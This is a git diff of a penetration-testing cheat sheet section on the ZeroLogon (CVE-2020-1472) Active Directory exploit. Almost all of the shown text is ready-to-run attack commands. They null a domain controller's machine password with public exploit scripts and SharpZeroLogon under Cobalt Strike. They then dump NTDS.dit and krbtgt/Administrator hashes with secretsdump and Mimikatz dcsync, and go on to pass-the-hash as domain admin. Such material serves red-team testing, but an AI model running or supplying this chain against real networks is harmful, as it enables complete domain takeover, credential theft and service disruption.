@@ -280,16 +280,22 @@ Exploit steps from the white paper
 1. Spoofing the client credential
 2. Disabling signing and sealing
 3. Spoofing a call
-4. Changing a computer's AD password
+4. Changing a computer's AD password to null
 5. From password change to domain admin
+6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
 
 ```powershell
 $ git clone https://github.com/cube0x0/CVE-2020-1472
+# Resetting the machine account password of DC01
 $ python3 CVE-2020-1472.py DC01 10.10.10.10
+
+# Execute secretsdump to extract the ntds.dit
 $ secretsdump.py 'domain/DC01$@DC01.domain.local' -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::  
+
+# Now reset the password back
 ```
 
 in .NET for Cobalt Strike's execute-assembly
@@ -298,22 +304,36 @@ in .NET for Cobalt Strike's execute-assembly
 git clone https://github.com/nccgroup/nccfsas
 # Check
 execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
+
 # Resetting the machine account password
 execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
+
 # Testing from a non Domain-joined machine
 execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
+
+# Now reset the password back
 ```
 
-with Mimikatz : 2.2.0 20200916 ZeroLogon & DCSync
+with Mimikatz : 2.2.0 20200917 Post-Zerologon
 
 ```powershell
 privilege::debug
 # Check for the CVE
 lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
+
 # Exploit the CVE and set the computer account's password to ""
 lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
+
 # Execute dcsync to extract some hashes
 lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+
+# Pass The Hash with the extracted Domain Admin hash
+sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
+
+# Reset password to Waza1234
+# Use IP address instead of FQDN to force NTLM with Windows APIs 
+lsadump::postzerologon /target:10.10.10.10 /account:DC01$
 ```
 
 ### Open Shares
